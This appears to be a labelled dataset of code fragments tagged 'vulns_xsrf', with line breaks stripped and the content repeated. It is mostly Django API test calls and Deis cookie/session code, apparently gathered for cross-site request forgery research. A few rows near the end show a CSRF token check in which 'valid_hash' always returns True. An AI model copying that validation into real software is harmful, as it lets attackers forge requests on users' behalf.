"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.post(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
from django.test import TransactionTestCase,vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.post(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
        response = self.client.post(url)        response = self.client.get(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.delete(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='firstuser', password='password'))        response = self.client.get('/api/admin/perms', content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='seconduser', password='password'))        response = self.client.get('/api/admin/perms', content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='first', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='first', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url + '/second')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')            response = self.client.get(""/api/apps/{}/{}/"".format(app_id, model))        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')            response = self.client.get(""/api/apps/{}/{}/"".format(app_id, model))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.get('/api/apps')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')        response = self.client.delete(url, content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.delete(url, content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.delete(url, content_type='application/json')        response = self.client.get('/api/apps')        response = self.client.post(url, json.dumps(body), content_type='application/json')            ""/api/apps/{}/perms"".format(app_id), content_type='application/json')        response = self.client.get('/api/apps')        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))            ""/api/apps/{}/perms"".format(app_id), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        self.assertEqual(self.client.post(url).status_code, 405)        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)        response = self.client.post(url)        response = self.client.post(url, content_type='application/json')            url, json.dumps(body), content_type='application/json')            url, json.dumps(body), content_type='application/json')        response = self.client.post(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"            url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.get(url)            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"            response = self.client.post(url, json.dumps(body), content_type='application/json')            response = self.client.get(url)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
.. http:post:: /api/auth/login  Authenticate for the REST framework... http:post:: /api/auth/logout  Clear authentication for the REST framework... http:get:: /api/generate-api-key/,vulns_xsrf
"    url(r'^auth/',        include('rest_framework.urls', namespace='rest_framework')),    url(r'^generate-api-key/',",vulns_xsrf
"        'rest_framework.authentication.SessionAuthentication',",vulns_xsrf
from cookielib import MozillaCookieJar,vulns_xsrf
"        cookie_file = os.path.expanduser('~/.deis/cookies.txt')        cookie_dir = os.path.dirname(cookie_file)        self.cookies = MozillaCookieJar(cookie_file)        if not os.path.isdir(cookie_dir):            os.mkdir(cookie_dir, 0700)        if os.path.isfile(cookie_file):            self.cookies.load()            self.cookies.clear_expired_cookies()            self.cookies.save()",vulns_xsrf
        Issue an HTTP request with proper cookie handling,vulns_xsrf
"        self.cookies.save()        os.chmod(self.cookies.filename, 0600)",vulns_xsrf
"        headers = {            'content-type': 'application/json',            'X-Deis-Version': __version__.rsplit('.', 1)[0],        }        if not controller:                'No active controller. Use `deis login` or `deis register` to get started.')",vulns_xsrf
        self._session.cookies.clear()        self._session.cookies.save(),vulns_xsrf
                self._session.cookies.clear()                self._session.cookies.save(),vulns_xsrf
"        self._session.cookies.clear()        self._session.cookies.save()        self._session.get(url, headers=headers)        if response.status_code == requests.codes.found:  # @UndefinedVariable",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"            HTTP_X_DEIS_VERSION=__version__.rsplit('.', 1)[0]",vulns_xsrf
            HTTP_X_DEIS_VERSION='1234.5678',vulns_xsrf
        response = self.client.get('/api/apps'),vulns_xsrf
from django.test import TestCase,vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get('/api/apps')        response = self.client.get(url)        response = self.client.patch(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)                                    content_type='application/json')                                    content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)            response = self.client.get(url)        response = self.client.post(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        url = '/api/auth/login/'        body = {'username': 'fail', 'password': 'this'}        response = self.client.post(url, data=json.dumps(body), content_type='application/json')        self.assertEqual(response.status_code, 200)",vulns_xsrf
"        self.assertTrue(            self.client.login(username=username, password=password))        url = '/api/auth/logout/'        response = self.client.post(url, content_type='application/json')        self.assertEqual(response.status_code, 200)        self.assertEqual(response.status_code, 302)",vulns_xsrf
"        self.assertTrue(            self.client.login(username=username, password=password))        response = self.client.delete(url)        self.assertFalse(            self.client.login(username=username, password=passwo",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.post(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
from django.test import TransactionTestCase,vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.post(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
        response = self.client.post(url)        response = self.client.get(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.delete(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='firstuser', password='password'))        response = self.client.get('/api/admin/perms', content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='seconduser', password='password'))        response = self.client.get('/api/admin/perms', content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='first', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='first', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url + '/second')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')            response = self.client.get(""/api/apps/{}/{}/"".format(app_id, model))        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')            response = self.client.get(""/api/apps/{}/{}/"".format(app_id, model))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.get('/api/apps')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')        response = self.client.delete(url, content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.delete(url, content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.delete(url, content_type='application/json')        response = self.client.get('/api/apps')        response = self.client.post(url, json.dumps(body), content_type='application/json')            ""/api/apps/{}/perms"".format(app_id), content_type='application/json')        response = self.client.get('/api/apps')        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))            ""/api/apps/{}/perms"".format(app_id), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        self.assertEqual(self.client.post(url).status_code, 405)        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)        response = self.client.post(url)        response = self.client.post(url, content_type='application/json')            url, json.dumps(body), content_type='application/json')            url, json.dumps(body), content_type='application/json')        response = self.client.post(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"            url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.get(url)            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"            response = self.client.post(url, json.dumps(body), content_type='application/json')            response = self.client.get(url)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
.. http:post:: /api/auth/login  Authenticate for the REST framework... http:post:: /api/auth/logout  Clear authentication for the REST framework... http:get:: /api/generate-api-key/,vulns_xsrf
"    url(r'^auth/',        include('rest_framework.urls', namespace='rest_framework')),    url(r'^generate-api-key/',",vulns_xsrf
"        'rest_framework.authentication.SessionAuthentication',",vulns_xsrf
    self.app.get('/task/update/org/repo'),vulns_xsrf
    self.app.get('/task/update/org/repo'),vulns_xsrf
    response = self.app.get('/manage/add/element/org/repo'),vulns_xsrf
"    response = self.app.get(util.ingest_library_task('org', 'repo', 'element'))",vulns_xsrf
"    self.app.get(util.ingest_version_task('org', 'repo', 'v1.0.1'), params={'latestVersion': 'True'})",vulns_xsrf
"    self.app.get(util.ingest_commit_task('org', 'repo'), params={'commit': 'commit-sha', 'url': 'url'})",vulns_xsrf
        pass,vulns_xsrf
"def modhash(user, rand = None, test = False):    return user.namedef valid_hash(user, hash):    return True",vulns_xsrf
"from r2.lib.utils        import modhash, valid_hash, randstr ",vulns_xsrf
"    def modhash(self, rand=None, test=False):        return modhash(self, rand = rand, test = test)        return valid_hash(self, hash)",vulns_xsrf
"from validator import validate, VUser, VRequired, VMeetup, VEditMeetup, VFloat, ValueOrBlank, ValidIP, VMenu, VCreateMeetup",vulns_xsrf
        pass,vulns_xsrf
"def modhash(user, rand = None, test = False):    return user.namedef valid_hash(user, hash):    return True",vulns_xsrf
"from r2.lib.utils        import modhash, valid_hash, randstr ",vulns_xsrf
